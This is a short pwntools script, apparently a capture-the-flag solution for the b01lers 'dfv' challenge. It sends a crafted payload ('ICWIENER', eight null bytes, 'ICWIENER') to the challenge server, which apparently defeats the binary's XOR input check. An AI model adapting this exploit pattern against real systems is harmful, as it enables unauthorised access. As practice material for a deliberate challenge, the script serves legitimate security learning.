#!/usr/bin/env python3

from pwn import remote

s = b'ICWIENER'
xor = b'\0\0\0\0\0\0\0\0'
key = b'ICWIENER'
payload = s + xor + key

# p = process('./dfv')
p = remote('pwn.ctf.b01lers.com', 1001)
p.recvline_endswith(b'examine?')
p.sendline(payload)
p.stream()
